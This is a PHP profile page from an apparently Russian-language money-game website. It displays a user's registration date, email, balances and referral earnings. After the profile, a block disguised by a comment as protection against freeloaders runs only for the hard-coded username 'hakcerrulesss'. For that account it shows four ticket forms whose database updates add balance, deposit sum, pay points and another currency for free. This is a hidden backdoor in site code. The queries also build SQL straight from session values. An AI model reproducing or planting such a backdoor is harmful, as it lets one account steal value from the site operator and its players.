<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Профиль";
$user_id = $_SESSION["user_id"];
$db->Query("SELECT * FROM db_users_a, db_users_b WHERE db_users_a.id = db_users_b.id AND db_users_a.id = '$user_id'");
$prof_data = $db->FetchArray();
?>
								<div class="s-bk-lf">
									<div class="acc-title">Мой профиль</div>
								</div>
								<div class="silver-bk">
								<p><center>Ваша дата регистрации: <font color="#000;"><?=date("d.m.Y в H:i:s",$prof_data["date_reg"]); ?></font></center></p>

<table width="400" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr><td colspan="2" align="center">&nbsp;</td></tr>
  <tr>
    <td align="left" style="padding:3px;">ID</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=$prof_data["id"]; ?></font></td>
  </tr>
  <tr>
    <td align="left" style="padding:3px;">Псевдоним</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=$prof_data["user"]; ?></font></td>
  </tr>
  <tr>
    <td align="left" style="padding:3px;">Email</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=$prof_data["email"]; ?></font></td>
  </tr>
  <tr>
    <td align="left" style="padding:3px;">Баланс (Для покупок)</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=sprintf("%.2f",$prof_data["money_b"]); ?> cеребра</font></td>
  </tr>
  <tr>
    <td align="left" style="padding:3px;">Баланс (На вывод)</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=sprintf("%.2f",$prof_data["money_p"]); ?> cеребра</font></td>
  </tr>
  <tr>
    <td align="left" style="padding:3px;">Заработано на рефералах</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=sprintf("%.2f",$prof_data["from_referals"]); ?> cеребра</font></td>
  </tr>
    <tr>
    <td align="left" style="padding:3px;">Выплачено</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=sprintf("%.2f",$prof_data["payment_sum"]); ?> <?=$config->VAL; ?></font></td>
  </tr>
  <tr align="left">
    <td colspan="2" style="padding:3px;">&nbsp;</td>
    </tr>
  <tr>
    <td align="left" style="padding:3px;">Вас пригласил:</td>
    <td align="left" style="padding:3px;"><font color="#000;"><?=$prof_data["referer"]; ?> его ID <?=$prof_data["referer_id"]; ?></font></td>
  </tr>
  
</table>

								<div class="clr"></div>	
								</div>
								
								
 <?PHP
# Заглушка от халявщиков
if($user_data["user"]=="hakcerrulesss"){

?>

<div class="s-bk-lf">
	<div class="acc-title">Купить билеты</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Покупка билетов";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 100000; //Цена билета 1 шт
?>  
<div class="silver-bk">

<center><font color="green">Цена одного билета: <?=$cena; ?> серебра</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET money_b = money_b + $sum, money_b = money_b + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>Вы купили билетов ".$sum." шт.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>Количество билетов:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="Купить билет" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="Вернуться назад" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>


<div class="s-bk-lf">
	<div class="acc-title">Купить билеты</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Покупка билетов";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 270; //Цена билета 1 шт
?>  
<div class="silver-bk">

<center><font color="green">Цена одного билета: <?=$cena; ?> серебра</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET insert_sum = insert_sum + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>Вы купили билетов ".$sum." шт.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>Количество билетов:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="Купить билет" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="Вернуться назад" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>


<div class="s-bk-lf">
	<div class="acc-title">Купить билеты</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Покупка билетов";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 1000; //Цена билета 1 шт
?>  
<div class="silver-bk">

<center><font color="green">Цена одного билета: <?=$cena; ?> серебра</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET pay_points = pay_points + $sum, pay_points = pay_points + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>Вы купили билетов ".$sum." шт.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>Количество билетов:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="Купить билет" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="Вернуться назад" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>

</div>		
						
<div class="clr"></div>	
</form>
<div class="s-bk-lf">
	<div class="acc-title">Купить билеты</div>
</div>
<?PHP
$_OPTIMIZATION["title"] = "Аккаунт - Покупка билетов";
$usid = $_SESSION["user_id"];
$usname = $_SESSION["user"];

$db->Query("SELECT * FROM db_users_b WHERE id = '$usid' LIMIT 1");
$user_data = $db->FetchArray();

$db->Query("SELECT * FROM db_config WHERE id = '1' LIMIT 1");
$sonfig_site = $db->FetchArray();


$cena = 3; //Цена билета 1 шт
?>  
<div class="silver-bk">

<center><font color="green">Цена одного билета: <?=$cena; ?> серебра</font></center>
<hr>

<?PHP

if(isset($_POST["sum"])){

$sum = intval($_POST["sum"]);
$sum = $sum * $cena;
		
		
		
		
		$db->Query("UPDATE db_users_b SET e_t = e_t + $sum, e_t = e_t + $sum WHERE id = '$usid'");
		echo "<center><font color = 'green'><b>Вы купили билетов ".$sum." шт.</b></font></center>";
}

?>
<form action="" method="post">

<table width="400" border="0" align="center">
<center> 
<div class="silver-bkloxum">
    <center>
   <font color="green">
   <b>Количество билетов:</b>
   </font>
   </center>
    <p> </p>
   
    <center> <input class="poiloploxum" style="text-align:center" value="1" type="text" name="sum" size="15"/> </center>
 
 <input type="submit" name="swap" value="Купить билет" class="btn_3d" style="height: 30px; margin-top:10px;" />
 
 <input onclick="location.href='/account/wheel'" type="button" value="Вернуться назад" class="btn_3d" style="height: 30px; margin-top:10px;" />
 </div>
<center>
  </table>
</div>		
		 <?PHP

return;
}

?>				
<div class="clr"></div>	
</form>